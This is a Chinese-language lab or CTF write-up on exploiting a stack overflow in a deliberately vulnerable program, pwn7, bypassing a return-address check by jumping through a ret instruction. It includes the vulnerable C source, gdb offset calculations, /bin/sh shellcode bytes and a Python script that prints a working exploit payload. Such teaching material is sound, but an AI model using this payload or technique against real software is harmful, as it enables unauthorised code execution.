先介绍一些这个实验要知道的一些东西

##  **builtin_return_address函数**

builtin_return_address函数接收一个参数，可以是0,1,2等。__builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址。还有多层跳转retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。

本文涉及相关实验：[《PWN练习之绕过返回地址限制》](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014110316261100001&pk_campaign=freebuf-wemedia)

先仔细看一下题目描述。主机/home/test/7目录下有一个pwn7程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后会产生对应的输出信息并直接退出，然而当输入一定的数据量时，可能会提示
**bzzzt**
的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行/bin/sh：

    
    
    \xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81

请对pwn7程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入数据，使之执行上面提供的Shellcode。

因为这个题目直接覆盖返回地址跳转到Shellcode执行是不行的，程序队返回地址进行了一点限制，学会绕过对返回地址的保护限制，以达到执行特定Shellcode的目的。所以看上去会难一些

我们先进行代码审计。

使用cd /home/test/7切换到程序所在目录，执行cat pwn7.c即可看到源代码：

    
    
    #include <stdio.h>
    
    #include <stdlib.h>
    
    #include <unistd.h>
    
    void getpath()
    
    {
    
    char buffer[64];
    
    unsigned int ret;
    
    printf("input path please: ");
    
    fflush(stdout);
    
    gets(buffer);
    
    ret = __builtin_return_address(0);
    
    if ((ret & 0xbf000000) == 0xbf000000)
    
    {
    
    printf("bzzzt (%p)\n", ret);
    
    _exit(1);
    
    }
    
    printf("got path %s\n", buffer);
    
    }
    
    int main(int argc, char** argv)
    
    {
    
    getpath();
    
    return 0;
    
    }

getpath函数中定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写。但是也可以看到这里对返回地址和0xbf000000进行与操作，如果高位字节是0xbf的话，那么程序就会退出。

执行gdb pwn7即可开始通过gdb对pwn7进行调试，现在我们需要阅读getpath函数的汇编代码，在gdb中执行disas getpath命令即可。

我们可以通过执行如下的指令来计算覆盖返回地址需要的字节数：

![headImg.action?news=34358196-88a2-4930-bf60-2f5b144f2092.png](https://image.3001.net/images/20210323/1616482430_6059907e4f0cd5fdea0a2.png!small)

上图中红色线条框起来的就是我们执行的gdb命令，粉红色线条框起来的是我们下断点的地址，蓝色线条框起来的是我们想要查看的两个寄存器的值，有：

0xffffd6bc - 0xffffd66c，那么这两个地址的差为80。

也就是说，在覆盖了80字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。现在因为对返回地址进行了限制，我们显然不能直接跳转到栈上执行代码，因为这里Shellcode的地址的最高字节为0xff，有0xff
& 0xbf == 0xbf，因此无法通过保护限制。

这里采用两次跳转的方法来突破这个限制。我们可以将一条retn指令的地址来覆盖函数的返回地址，比如getpath的最后一条指令为：

    
    
    0x080484e9 <+117>: ret

那么，0x080484e9 & 0xbf000000 =
0x08000000，可以绕过保护限制，我们让这条retn指令执行时，从栈上取到的数据为Shellcode的地址，就可以执行Shellcode了。那么，我们构造的输入数据应该是这样的：

![headImg.action?news=ae0ce1ed-5fbf-4b0f-9a78-5de0dacea3bc.png](https://image.3001.net/images/20210323/1616482431_6059907fcaa6f27816db3.png!small)

在gdb调试器下调试pwn7程序时，只要合理控制输入数据的第81~84字节的内容，就可以实现对函数返回地址进行覆盖，我们可以将返回地址填充为0x080484e9来实现执行一条retn指令。

同时，我们将第85~88字节覆盖为Shellcode的地址。即0xffffd6bc+4+4 = 0xffffd6c4，我们对输入数据的构造的布局如下：

![headImg.action?news=14c795c6-8073-4f83-ac1f-8a7ebe259ffe.png](https://image.3001.net/images/20210323/1616482433_60599081671b751107463.png!small)

在/home/test/7目录下有一个pwn7.py的Python脚本，其源代码如下：

    
    
    shellcode =("\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe" +
    
    "\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff" +
    
    "\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69" +
    
    "\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81")
    
    print'A'*80 +'\xe9\x84\x04\x08' +'\xc4\xd6\xff\xff' +shellcode

在Shell下执行python pwn7.py > test将输出数据写入test文件，然后再次使用gdb调试pwn7程序，gdb载入pwn7程序后，执行r
< test命令，表示将test文件的数据当做输入数据传给pwn7程序，可以看到Shellcode成功执行，新创建了一个/bin/bash进程：

![headImg.action?news=b6393b5b-3464-49ab-96d3-5aa8dc27278a.png](https://image.3001.net/images/20210323/1616482433_60599081e2d8dcb764ac0.png!small)

PWN练习还是很有难度的，总的来说比之前接触的实验上了一个档次，不过话说回来，咱们有关PWN题型的练习也告一段落了，接下来要开始接触新的知识了。

